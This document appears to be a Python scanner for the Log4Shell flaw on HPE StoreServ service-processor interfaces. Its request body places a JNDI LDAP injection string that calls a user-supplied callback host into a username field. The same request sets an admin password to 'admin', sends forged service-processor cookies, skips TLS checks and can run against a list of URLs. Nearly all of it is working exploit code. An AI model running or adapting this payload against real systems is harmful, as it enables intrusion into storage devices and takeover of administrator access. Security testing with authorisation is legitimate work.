#!/usr/bin/env python
#
# 
#
# HPE StoreServ Log4J Vuln Check
#
# By @RandomRobbieBF
# 
#

import requests
import sys
from random import randint
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-c", "--collab", default="",required=True, help="Collaborator URL")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
urls = args.file
collaburl = args.collab


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy
	
	

            
           

def test_url(url,collaburl):
	r1 = randint(1, 12312)
	rawBody = "{\"newPassword\":\"admin\",\"newUserName\":\"\x24{jndi:ldap:\\/\\/q.{hostName}."+str(r1)+"."+collaburl+"\\/s2test}\"}"
	headers = {"Origin":""+url+"","Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0","Referer":""+url+"/","Connection":"close","Sec-Fetch-Dest":"empty","Sec-Fetch-Site":"same-origin","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"cors","Te":"trailers","Cache-Control":"max-age=0","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/json"}
	cookies = {"CIC_PROP_isServiceProcessor":"true","CIC_PROP_isServiceProcessorOnly":"true","CIC_PROP_isSystemInitialized":"true"}
	response = session.post(""+url+"/servicesupport/REST/spservice/sp/isresetLocaladminpassword", data=rawBody, headers=headers, cookies=cookies,verify=False)
	print("Check Burp Collab For any Response")



			

				


if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					test_url(url,collaburl)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	print("Testing "+url+" with Collab url "+collaburl+"")
	test_url(url,collaburl)
